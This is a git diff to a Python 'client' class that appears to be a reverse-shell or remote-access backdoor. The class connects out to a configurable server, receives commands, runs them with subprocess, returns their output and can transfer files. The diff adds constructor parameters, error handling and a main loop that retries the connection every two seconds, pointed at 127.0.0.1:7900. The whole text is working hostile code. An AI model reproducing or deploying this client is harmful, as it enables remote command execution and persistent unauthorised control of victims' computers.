@@ -1,10 +1,18 @@
 import socket
 import os
 import subprocess
-
+from time import sleep
 
 class client:
-    client_socket= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+    client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server_ip=""
+    server_port=""
+    def __init__(self,server_ip,server_port):
+        self.server_ip=server_ip
+        self.server_port=server_port
+
+
 
     def download (self,path_input):
         if os.path.exists(path_input):
@@ -50,8 +58,8 @@ class client:
             exit
 
 
-    def client_connect(self,server_ip,server_port):
-        self.client_socket.connect((server_ip,server_port))
+    def client_connect(self):
+        self.client_socket.connect((self.server_ip,int(self.server_port)))
         try:
             while True:
                 command=self.client_socket.recv(2048)
@@ -90,13 +98,27 @@ class client:
                     response_byte=response.stderr
                 response_byte= response_byte.decode()+"ENDOFMESSAGE"
                 self.client_socket.sendall(response_byte.encode())
-
+                
+        except ConnectionRefusedError: 
+             print(f"Connection refused. Make sure the server is running at {self.server_ip}:{self.server_port}")
+        except socket.gaierror:
+            print(f"Address resolution error. Could not resolve {self.server_ip}.")
         except Exception: print("Exception occured")
-        self.client_socket.close()
-        exit
+
+        finally:
+            print("Client connection closed.")
+            if self.client_socket and not self.client_socket._closed:
+                self.client_socket.close()
 
 
 
-
-client_test = client
-client_test.client_connect(client_test,"127.0.0.1",8000)
+if __name__=="__main__":
+    new_client = client("127.0.0.1","7900")
+    new_client.client_connect()
+    while True:
+        try:
+            new_client.client_connect()
+        except KeyboardInterrupt:
+            print("\nClient shutting down.")
+            break
+        sleep(2)
